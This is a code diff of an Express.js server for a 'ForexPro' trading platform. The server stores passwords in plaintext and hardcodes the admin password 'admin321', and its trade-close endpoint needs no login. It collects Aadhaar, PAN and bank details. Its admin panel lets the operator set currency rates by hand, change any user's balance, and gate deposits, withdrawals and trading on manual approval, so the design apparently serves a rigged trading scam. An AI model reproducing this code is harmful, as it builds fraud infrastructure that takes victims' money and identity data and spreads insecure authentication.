+  if (!username || !password) return res.send(getAuthPage('Please fill all fields'));
+  const exists = db.users.find(u => u.username.toLowerCase() === username.toLowerCase());
+  if (exists) return res.send(getAuthPage('Username already taken'));
+  
+  db.users.push({
+    id: nextUserId++,
+    username,
+    password,
+    balance: 0,
+    equity: 0,
+    margin: 0,
+    kycStatus: 'Not Verified',
+    kycData: {}
+  });
+  res.send(getAuthPage('Account Created! Please Login.'));
 });
 
 app.post('/login', (req, res) => {
   const { username, password } = req.body;
   const user = db.users.find(u => u.username === username && u.password === password);
-  if(!user) return res.send(getAuthPage('Invalid username or password!'));
+  if (!user) return res.send(getAuthPage('Invalid Credentials'));
+  
   req.session.userId = user.id;
   res.redirect('/dashboard');
+});
+
+app.get('/dashboard', requireAuth, (req, res) => {
+  res.send(getDashboardPage());
+});
+
+app.get('/admin', (req, res) => {
+  if (req.session.isAdmin) return res.redirect('/admin-panel');
+  res.send(getAdminLoginPage());
+});
+
+app.post('/admin/login', (req, res) => {
+  const { password } = req.body;
+  if (password === 'admin321') {
+    req.session.isAdmin = true;
+    return res.redirect('/admin-panel');
+  }
+  res.send(getAdminLoginPage('Invalid Master Password'));
+});
+
+app.get('/admin-panel', requireAdmin, (req, res) => {
+  res.send(getAdminDashboardPage());
 });
 
 app.get('/logout', (req, res) => {
@@ -792,198 +854,150 @@ app.get('/logout', (req, res) => {
   res.redirect('/');
 });
 
-// Client Dashboard Routes
-app.get('/dashboard', requireAuth, (req, res) => res.send(getDashboardPage()));
-
+// JSON API
 app.get('/api/user/data', requireAuth, (req, res) => {
   const user = db.users.find(u => u.id === req.session.userId);
-  const trades = db.trades.filter(t => t.userId === user.id);
-  const deposits = db.deposits.filter(d => d.userId === user.id).map(d => ({...d, type: 'Deposit', details: d.utr}));
-  const withdrawals = db.withdrawals.filter(w => w.userId === user.id).map(w => ({...w, type: 'Withdrawal', details: w.wallet}));
+  const trades = db.trades.filter(t => t.userId === req.session.userId);
+  const deposits = db.deposits.filter(d => d.userId === req.session.userId);
+  const withdrawals = db.withdrawals.filter(w => w.userId === req.session.userId);
+  
   res.json({ success: true, user, trades, deposits, withdrawals, liveRates: db.rates });
-});
-
-// PLACE TRADE POSITION
-app.post('/api/trade/place', requireAuth, (req, res) => {
-  const { pair, type, amount } = req.body;
-  const user = db.users.find(u => u.id === req.session.userId);
-  const parsedAmount = parseFloat(amount);
-  
-  if(user.balance < parsedAmount) {
-    return res.json({ success: false, message: 'Insufficient wallet balance to open this lot position.' });
-  }
-  
-  // Deduct initial lot cost from primary balance
-  user.balance = parseFloat((user.balance - parsedAmount).toFixed(2));
-  
-  const newTrade = {
-    id: nextTradeId++,
-    userId: user.id,
-    pair: pair,
-    type: type,
-    amount: parsedAmount,
-    entry: db.rates[pair],
-    exit: null,
-    pl: 0.00,
-    status: 'Open'
-  };
-  
-  db.trades.push(newTrade);
-  res.json({ success: true, message: 'Trade Position Executed Successfully! View in Active Positions below.' });
-});
-
-// CLOSE ACTIVE POSITION
-app.post('/api/trade/close', requireAuth, (req, res) => {
-  const { tradeId } = req.body;
-  const user = db.users.find(u => u.id === req.session.userId);
-  const trade = db.trades.find(t => t.id === parseInt(tradeId) && t.userId === user.id);
-  
-  if(trade && trade.status === 'Open') {
-    trade.status = 'Closed';
-    trade.exit = db.rates[trade.pair];
-    
-    // Add back lot principal amount + any generated Profit/Loss safely
-    user.balance = parseFloat((user.balance + trade.amount + trade.pl).toFixed(2));
-    res.json({ success: true, message: 'Position liquidated and closed safely!' });
-  } else {
-    res.json({ success: false, message: 'Active trade position not found!' });
-  }
 });
 
 app.post('/api/kyc/submit', requireAuth, (req, res) => {
   const { email, aadhar, pan, bank } = req.body;
   const user = db.users.find(u => u.id === req.session.userId);
-  if(user) {
-    user.kycStatus = 'Pending';
-    user.kycData = { email, aadhar, pan, bank };
-    res.json({ success: true, message: 'KYC Details submitted successfully! Awaiting validation.' });
-  } else {
-    res.json({ success: false, message: 'User not found!' });
+  user.kycStatus = 'Pending';
+  user.kycData = { email, aadhar, pan, bank };
+  res.json({ success: true, message: 'KYC Details submitted successfully.' });
+});
+
+app.post('/api/trade/place', requireAuth, (req, res) => {
+  const { pair, type, amount } = req.body;
+  const user = db.users.find(u => u.id === req.session.userId);
+  
+  if (user.kycStatus !== 'Approved') {
+    return res.json({ success: false, message: 'Trading disabled! KYC verification is required.' });
   }
+  if (user.balance < amount) {
+    return res.json({ success: false, message: 'Insufficient balance to place trade lot.' });
+  }
+
+  const currentRate = db.rates[pair];
+  db.trades.push({
+    id: nextTradeId++,
+    userId: user.id,
+    pair,
+    type,
+    amount,
+    entry: currentRate,
+    exit: null,
+    pl: 0,
+    status: 'Open'
+  });
+  res.json({ success: true, message: 'Trade executing at live terminal!' });
+});
+
+// Postion Close Logic (Both User Trigger via Admin or Directly by Admin Panel)
+app.post('/api/trade/close', (req, res) => {
+  const { tradeId } = req.body;
+  const t = db.trades.find(trade => trade.id === parseInt(tradeId));
+  if (!t || t.status !== 'Open') return res.json({ success: false, message: 'Trade already closed or not found' });
+  
+  const user = db.users.find(u => u.id === t.userId);
+  const currentRate = db.rates[t.pair];
+  
+  let diff = currentRate - t.entry;
+  if (t.type === 'SELL') { diff = t.entry - currentRate; }
+  let multiplier = t.pair === 'USD/JPY' ? 100 : 10000;
+  
+  t.pl = parseFloat((diff * (t.amount / t.entry) * multiplier).toFixed(2));
+  t.exit = currentRate;
+  t.status = 'Closed';
+  user.balance = parseFloat((user.balance + t.pl).toFixed(2));
+  
+  res.json({ success: true, message: `Position locked. Profit/Loss applied: $${t.pl}` });
 });
 
 app.post('/api/deposit', requireAuth, (req, res) => {
   const { amount, utr } = req.body;
   const user = db.users.find(u => u.id === req.session.userId);
-  db.deposits.push({ id: nextDepId++, userId: user.id, username: user.username, amount: parseFloat(amount), utr, status: 'Pending', date: new Date() });
-  res.json({ success: true, message: 'Deposit request submitted successfully! Awaiting admin approval.' });
+  db.deposits.push({ id: nextDepId++, userId: user.id, username: user.username, type: 'DEPOSIT', amount, details: `UTR: ${utr}`, utr, status: 'Pending' });
+  res.json({ success: true, message: 'Deposit request sent to clearing hub.' });
 });
 
 app.post('/api/withdraw', requireAuth, (req, res) => {
   const { amount, wallet } = req.body;
   const user = db.users.find(u => u.id === req.session.userId);
-  if(user.balance < parseFloat(amount)) return res.json({ success: false, message: 'Insufficient balance!' });
-  db.withdrawals.push({ id: nextWdId++, userId: user.id, username: user.username, amount: parseFloat(amount), wallet, status: 'Pending', date: new Date() });
-  res.json({ success: true, message: 'Withdrawal request submitted successfully! Awaiting admin approval.' });
+  if (user.balance < amount) return res.json({ success: false, message: 'Insufficient balance available.' });
+  
+  db.withdrawals.push({ id: nextWdId++, userId: user.id, username: user.username, type: 'WITHDRAWAL', amount, details: `Wallet: ${wallet}`, wallet, status: 'Pending' });
+  res.json({ success: true, message: 'Withdrawal settlement processing.' });
 });
 
-// Admin Panel Routes
-app.get('/admin', (req, res) => {
-  if(req.session.isAdmin) return res.redirect('/admin-panel');
-  res.send(getAdminLoginPage());
-});
-
-app.post('/admin/login', (req, res) => {
-  const { password } = req.body;
-  if(password === 'MTHACK') {
-    req.session.isAdmin = true;
-    res.redirect('/admin-panel');
-  } else {
-    res.send(getAdminLoginPage('Invalid admin password! Access denied.'));
-  }
-});
-
-app.get('/admin-panel', requireAdmin, (req, res) => res.send(getAdminDashboardPage()));
-
+// Admin Control Panel Endpoints
 app.get('/api/admin/data', requireAdmin, (req, res) => {
-  const users = db.users.map(u => {
-    // Get distinct pairs this user currently has open positions in
-    const activePairs = [...new Set(db.trades.filter(t => t.userId === u.id && t.status === 'Open').map(t => t.pair))];
-    return { id: u.id, username: u.username, password: u.password, balance: u.balance, kycStatus: u.kycStatus, kycData: u.kycData, activePairs };
-  });
-  const deposits = db.deposits.filter(d => d.status === 'Pending');
-  const withdrawals = db.withdrawals.filter(w => w.status === 'Pending');
-  res.json({ success: true, users, deposits, withdrawals, rates: db.rates });
+  res.json({ success: true, users: db.users, deposits: db.deposits, withdrawals: db.withdrawals, rates: db.rates, trades: db.trades });
 });
 
-// ADMIN API TO CHANGE CURRENCY PRICE DYNAMICALLY
-app.post('/api/admin/update-rate', requireAdmin, (req, res) => {
+app.post('/api/admin/override-rate', requireAdmin, (req, res) => {
   const { pair, rate } = req.body;
-  if(db.rates[pair] !== undefined) {
-    db.rates[pair] = parseFloat(rate);
-    res.json({ success: true });
-  } else {
-    res.json({ success: false });
-  }
+  if (db.rates[pair] !== undefined) db.rates[pair] = parseFloat(rate);
+  res.json({ success: true });
 });
 
-app.post('/api/admin/update-balance', requireAdmin, (req, res) => {
-  const { userId, balance } = req.body;
-  const user = db.users.find(u => u.id === userId);
-  if(user) {
-    user.balance = parseFloat(balance);
-    res.json({ success: true });
-  } else {
-    res.json({ success: false });
-  }
+app.post('/api/admin/adjust-balance', requireAdmin, (req, res) => {
+  const { userId, amount } = req.body;
+  const user = db.users.find(u => u.id === parseInt(userId));
+  if (user) user.balance = parseFloat((user.balance + parseFloat(amount)).toFixed(2));
+  res.json({ success: true });
 });
 
 app.post('/api/admin/verify-kyc', requireAdmin, (req, res) => {
   const { userId, status } = req.body;
-  const user = db.users.find(u => u.id === userId);
-  if(user) {
-    user.kycStatus = status;
-    res.json({ success: true });
-  } else {
-    res.json({ success: false });
-  }
+  const user = db.users.find(u => u.id === parseInt(userId));
+  if (user) user.kycStatus = status;
+  res.json({ success: true });
 });
 
-app.post('/api/admin/approve-deposit', requireAdmin, (req, res) => {
+app.post('/api/admin/deposit/approve', requireAdmin, (req, res) => {
   const { id } = req.body;
   const dep = db.deposits.find(d => d.id === parseInt(id));
-  if(dep && dep.status === 'Pending') {
+  if (dep && dep.status === 'Pending') {
     dep.status = 'Approved';
     const user = db.users.find(u => u.id === dep.userId);
-    if(user) user.balance += dep.amount;
-    res.json({ success: true });
-  } else {
-    res.json({ success: false });
+    if (user) user.balance += dep.amount;
   }
+  res.json({ success: true });
 });
 
-app.post('/api/admin/reject-deposit', requireAdmin, (req, res) => {
+app.post('/api/admin/deposit/reject', requireAdmin, (req, res) => {
   const { id } = req.body;
   const dep = db.deposits.find(d => d.id === parseInt(id));
-  if(dep) dep.status = 'Rejected';
+  if (dep) dep.status = 'Rejected';
   res.json({ success: true });
 });
 
 app.post('/api/admin/approve-withdraw', requireAdmin, (req, res) => {
   const { id } = req.body;
   const wd = db.withdrawals.find(w => w.id === parseInt(id));
-  if(wd && wd.status === 'Pending') {
+  if (wd && wd.status === 'Pending') {
     wd.status = 'Approved';
     const user = db.users.find(u => u.id === wd.userId);
-    if(user) {
-      user.balance -= wd.amount;
-      if(user.balance < 0) user.balance = 0;
-    }
-    res.json({ success: true });
-  } else {
-    res.json({ success: false });
+    if (user) user.balance -= wd.amount;
   }
+  res.json({ success: true });
 });
 
 app.post('/api/admin/reject-withdraw', requireAdmin, (req, res) => {
   const { id } = req.body;
   const wd = db.withdrawals.find(w => w.id === parseInt(id));
-  if(wd) wd.status = 'Rejected';
+  if (wd) wd.status = 'Rejected';
   res.json({ success: true });
 });
 
 app.post('/api/admin/upload-qr', requireAdmin, upload.single('qr'), (req, res) => {
-  if(req.file) {
+  if (req.file) {
     db.settings.qrCodeBuffer = req.file.buffer;
     db.settings.qrCodeMime = req.file.mimetype;
     res.json({ success: true });
@@ -993,7 +1007,7 @@ app.post('/api/admin/upload-qr', requireAdmin, upload.single('qr'), (req, res) =
 });
 
 app.get('/qr-image', (req, res) => {
-  if(db.settings.qrCodeBuffer) {
+  if (db.settings.qrCodeBuffer) {
     res.set('Content-Type', db.settings.qrCodeMime);
     res.send(db.settings.qrCodeBuffer);
   } else {
@@ -1001,15 +1015,9 @@ app.get('/qr-image', (req, res) => {
     res.send(`<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200" viewBox="0 0 200 200">
       <rect width="200" height="200" fill="#121212"/>
       <text x="50%" y="45%" dominant-baseline="middle" text-anchor="middle" fill="#00ff88" font-family="sans-serif" font-size="16" font-weight="bold">QR CODE</text>
-      <text x="50%" y="60%" dominant-baseline="middle" text-anchor="middle" fill="#888" font-family="sans-serif" font-size="10">Upload in Admin</text>
+      <text x="50%" y="60%" dominant-baseline="middle" text-anchor="middle" fill="#888888" font-family="sans-serif" font-size="12">Not Uploaded Yet</text>
     </svg>`);
   }
 });
 
-// ==========================================
-// 6. START SERVER
-// ==========================================
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-  console.log(`🚀 ForexPro Platform running on port ${PORT}`);
-});
+app.listen(3000, () => console.log('Terminal online at port 3000'));
